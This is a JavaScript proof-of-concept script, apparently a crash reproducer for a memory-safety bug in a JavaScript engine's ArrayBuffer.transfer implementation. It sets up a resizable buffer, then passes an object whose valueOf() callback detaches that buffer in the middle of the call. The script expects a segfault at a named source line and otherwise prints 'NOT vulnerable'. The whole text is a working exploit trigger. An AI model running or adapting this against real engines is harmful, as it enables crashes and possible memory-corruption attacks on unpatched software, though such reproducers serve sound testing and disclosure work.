print("[*] Creating resizable ArrayBuffer(0x100, maxByteLength=0x1000)...");
let ab = new ArrayBuffer(0x100, { maxByteLength: 0x1000 });
print("[*] byteLength = " + ab.byteLength + ", maxByteLength = " + ab.maxByteLength);

print("[*] Crafting malicious newLen object with valueOf side-effect...");
let newLen = {
    valueOf() {
        print("[!] valueOf() triggered — calling ab.transfer() to detach buffer mid-call");
        ab.transfer();
        print("[!] Buffer detached. m_isResizable still true, m_backingStore = null");
        return 100;
    }
};

print("[*] Calling ab.transfer(newLen) — SIGSEGV expected at BuiltinArrayBuffer.cpp:153");
try {
ab.transfer(newLen);
} catch(e) {
}
print("[-] no crash — NOT vulnerable");
